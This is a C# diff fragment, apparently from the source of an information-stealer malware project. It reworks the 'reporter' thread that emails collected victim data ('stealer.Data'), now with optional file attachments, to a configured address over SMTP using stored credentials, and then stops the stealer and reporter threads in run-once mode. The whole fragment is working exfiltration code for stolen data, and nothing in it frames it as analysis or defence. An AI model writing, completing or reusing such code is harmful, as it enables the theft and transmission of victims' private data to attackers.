@@ -24,19 +24,24 @@ namespace sub.Util.Threading
                                                {
                                                    Thread.Sleep(_delay*60000);
                                                }
-                                               if(!string.IsNullOrEmpty(stealer.Data))
+                                               ReportEmail em = new ReportEmail(stealer.Name,
+                                                                                Program.Settings.EmailAddress,
+                                                                                Program.Settings.EmailPassword,
+                                                                                Program.Settings.SmtpAddress,
+                                                                                Program.Settings.SmtpPort);
+                                               if (stealer.Attachment == null)
                                                {
-                                                   new ReportEmail(stealer.Name, Program.Settings.EmailAddress,
-                                                                   Program.Settings.EmailPassword,
-                                                                   Program.Settings.SmtpAddress, Program.Settings.SmtpPort).Send(
-                                                                       stealer.Data);
-                                                   stealer.Data = null;
-                                                   if (runOnce)
-                                                   {
-                                                       _stealer.Abort();
-                                                       _reporter.Abort();
-                                                       break;
-                                                   }
+                                                   em.Send(stealer.Data);
+                                               } else
+                                               {
+                                                   em.Send(stealer.Data, stealer.Attachment);
+                                               }
+                                               stealer.Data = null;
+                                               if (runOnce)
+                                               {
+                                                   _stealer.Abort();
+                                                   _reporter.Abort();
+                                                   break;
                                                }
                                            }
                                        });
